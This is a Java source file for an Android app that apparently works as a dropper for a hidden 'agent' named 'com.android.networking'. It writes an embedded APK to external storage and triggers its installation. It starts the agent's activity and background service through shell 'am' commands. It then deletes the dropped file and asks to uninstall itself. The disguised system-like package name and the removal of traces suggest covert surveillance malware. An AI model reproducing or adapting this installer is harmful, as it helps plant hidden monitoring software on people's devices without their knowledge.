package com.android.agentinstaller;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.io.StringWriter;
import java.io.Writer;
import java.util.ArrayList;
import java.util.List;

import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.content.res.Resources;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.Toast;
import android.widget.TextView.BufferType;

public class InstallActivity extends Activity {

	private static final String TAG = "QZ";
	private static final Object AGENT_NAME = "com.android.networking";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_install_activity);

		boolean isInstalled = isInstalledAgent();
		boolean isRunning = isRunningAgent();

		CheckBox chkInstalled = (CheckBox) findViewById(R.id.CheckBoxAgentInstalled);
		Button button = (Button) findViewById(R.id.ButtonInstall);
		if (isInstalled) {
			Log.d(TAG, "already installed");

			chkInstalled.setChecked(true);
			button.setText("Upgrade Agent", BufferType.NORMAL);

		} else {
			chkInstalled.setChecked(false);
		}

		CheckBox chkRunning = (CheckBox) findViewById(R.id.checkBoxRunning);
		chkRunning.setChecked(isRunning);

	}

	private boolean isRunningAgent() {
		ActivityManager manager = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);
		List<RunningAppProcessInfo> service= manager.getRunningAppProcesses();
		for (RunningAppProcessInfo runningAppProcessInfo : service) {
			if(runningAppProcessInfo.processName.equals(AGENT_NAME)){
				return true;
			}
		}
		 
	
		return false;
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.activity_install_activty, menu);
		return true;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();

		boolean isInstalled = isInstalledAgent();
		boolean isRunning = isRunningAgent();

		if (isInstalled && !isRunning) {
			try {
				Log.d(TAG, "starting activity");
				Process p = Runtime.getRuntime().exec("am start com.android.networking/.gui.HGui");
				String output = inputStreamToString(p.getInputStream());
				Log.w(TAG, output);
				String error = inputStreamToString(p.getErrorStream());
				Log.e(TAG, error);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			try {
				Log.d(TAG, "starting service");
				Process p = Runtime.getRuntime().exec("am startservice com.android.networking/.ServiceMain");
				String output = inputStreamToString(p.getInputStream());
				Log.w(TAG, output);
				String error = inputStreamToString(p.getErrorStream());
				Log.e(TAG, error);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} else {
			Toast.makeText(getApplicationContext(), "Agent not installed", 1000);
		}

		File assetDestination = new File(Environment.getExternalStorageDirectory() + "/i.apk");
		if (assetDestination.exists()) {
			assetDestination.delete();
		}

		Uri packageURI = Uri.parse("package:" + getApplicationContext().getPackageName());
		Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
		startActivity(uninstallIntent);
	}

	public void installAgent(View view) {
		Log.d(TAG, "install agent");

		File assetDestination = new File(Environment.getExternalStorageDirectory() + "/i.apk");
		byte[] content = loadAsset("installer.v2.apk");
		FileOutputStream f;
		try {
			f = new FileOutputStream(assetDestination);
			f.write(content, 0, content.length);

			Intent intent = new Intent(Intent.ACTION_VIEW);
			intent.setDataAndType(Uri.fromFile(assetDestination), "application/vnd.android.package-archive");
			startActivity(intent);

		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	public byte[] loadAsset(String resource) {
		try {
			AssetManager assetManager = getAssets();
			InputStream in_s = assetManager.open(resource);

			byte[] b = new byte[in_s.available()];
			in_s.read(b);
			return b;
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}

	public static String inputStreamToString(InputStream is) throws IOException {
		if (is != null) {
			Writer writer = new StringWriter();

			char[] buffer = new char[1024];
			try {
				Reader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
				int n;
				while ((n = reader.read(buffer)) != -1) {
					writer.write(buffer, 0, n);
				}
			} finally {
				is.close();
			}
			return writer.toString();
		} else {
			return "";
		}
	}

	/**
	 * Gets the installed apps.
	 * 
	 * @param getSysPackages
	 *            the get sys packages
	 * @return the installed apps
	 */
	private boolean isInstalledAgent() {

		final PackageManager packageManager = getPackageManager();

		final List<PackageInfo> packs = packageManager.getInstalledPackages(0);

		for (int i = 0; i < packs.size(); i++) {
			final PackageInfo p = packs.get(i);

			String appname = p.applicationInfo.loadLabel(packageManager).toString();
			String pname = p.packageName;
			String versionName = p.versionName;
			int versionCode = p.versionCode;

			Log.d(TAG, String.format("%s %s %s %s", appname, pname, versionName, versionCode));

			if (AGENT_NAME.equals(pname)) {
				return true;
			}

		}

		return false;
	}
}
